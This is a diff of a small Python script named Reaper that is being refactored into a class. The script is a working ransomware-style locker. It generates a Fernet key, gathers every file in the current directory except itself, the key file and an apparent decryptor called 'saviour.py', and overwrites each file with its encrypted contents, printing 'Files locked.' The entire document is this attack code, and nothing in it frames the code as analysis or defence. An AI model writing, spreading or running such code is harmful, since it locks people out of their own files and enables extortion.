@@ -1,9 +1,6 @@
 import os
 from cryptography.fernet import Fernet
 
-targets = []
-
-# This is the new Reaper.
 
 def generate_key():
     key = Fernet.generate_key()
@@ -14,28 +11,38 @@ def generate_key():
     return key
 
 
-def gather_targets():
-    for file in os.listdir():
-        if file == "Reaper.py" or file == "key.key" or file == "saviour.py":
-            continue
+class Reaper:
+    targets = []
 
-        if os.path.isdir(file):
-            continue
+    def gather_targets(self):
+        for file in os.listdir():
+            if file == "Reaper.py" or file == "key.key" or file == "saviour.py":
+                continue
 
-        targets.append(file)
+            if os.path.isdir(file):
+                continue
+
+            self.targets.append(file)
+
+    def encrypt(self, key):
+        for file in self.targets:
+            with open(file, "rb") as target_file:
+                plain_text = target_file.read()
+                cipher = Fernet(key).encrypt(plain_text)
+
+            with open(file, "wb") as target_file:
+                target_file.write(cipher)
+
+        print("Files locked.")
+
+    def start(self):
+        print("Generating key...")
+        key = generate_key()
+        print("Locating targets...")
+        self.gather_targets()
+        print("Encrypting files...")
+        self.encrypt(key)
 
 
-def encrypt(key):
-    for file in targets:
-        with open(file, "rb") as target_file:
-            plain_text = target_file.read()
-            cipher = Fernet(key).encrypt(plain_text)
-
-        with open(file, "wb") as target_file:
-            target_file.write(cipher)
-
-    print("Done.")
-
-
-gather_targets()
-encrypt(generate_key())
+reaper = Reaper()
+reaper.start()
